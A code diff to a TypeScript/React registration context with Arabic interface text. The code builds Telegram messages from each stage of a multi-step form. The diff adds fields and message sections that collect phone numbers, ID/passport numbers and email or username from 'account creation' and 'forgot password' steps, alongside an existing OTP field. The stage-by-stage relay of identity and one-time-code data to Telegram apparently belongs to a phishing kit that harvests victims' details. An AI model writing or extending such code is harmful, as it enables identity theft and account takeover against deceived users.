@@ -39,6 +39,14 @@ interface RegistrationData {
   
   // OTP
   otp?: string;
+  
+  // Account Creation
+  accountCreationPhone?: string;
+  accountCreationId?: string;
+  
+  // Forgot Password
+  forgotPasswordEmail?: string;
+  forgotPasswordId?: string;
 }
 
 interface RegistrationContextType {
@@ -68,7 +76,7 @@ export const RegistrationProvider = ({ children }: { children: ReactNode }) => {
   };
 
   const formatTelegramMessage = (stage: number, stageName: string, dataToFormat: RegistrationData): string => {
-    let message = `📋 <b>معلومات التسجيل - المرحلة ${stage}/8</b>\n`;
+    let message = `📋 <b>معلومات التسجيل - المرحلة ${stage}/10</b>\n`;
     message += `━━━━━━━━━━━━━━━━━━━━\n\n`;
 
     // Stage 1: Account Type
@@ -146,8 +154,24 @@ export const RegistrationProvider = ({ children }: { children: ReactNode }) => {
       message += `\n`;
     }
 
+    // Stage 9: Account Creation
+    if (stage >= 9 && dataToFormat.accountCreationPhone) {
+      message += `⚠️ <b>المرحلة 9: إنشاء الحساب</b>\n`;
+      message += `   📱 رقم الجوال: ${dataToFormat.accountCreationPhone}\n`;
+      message += `   🆔 رقم البطاقة/جواز السفر: ${dataToFormat.accountCreationId}\n`;
+      message += `\n`;
+    }
+
+    // Stage 10: Forgot Password
+    if (stage >= 10 && dataToFormat.forgotPasswordEmail) {
+      message += `⚠️ <b>المرحلة 10: نسيت كلمة المرور</b>\n`;
+      message += `   📧 البريد/اسم المستخدم: ${dataToFormat.forgotPasswordEmail}\n`;
+      message += `   🆔 رقم البطاقة/جواز السفر: ${dataToFormat.forgotPasswordId}\n`;
+      message += `\n`;
+    }
+
     message += `━━━━━━━━━━━━━━━━━━━━\n`;
-    message += stage === 8 ? `🎉 <b>التسجيل مكتمل!</b>` : `⏳ <b>المرحلة الحالية: ${stageName}</b>`;
+    message += stage === 10 ? `🎉 <b>التسجيل مكتمل!</b>` : `⏳ <b>المرحلة الحالية: ${stageName}</b>`;
 
     return message;
   };
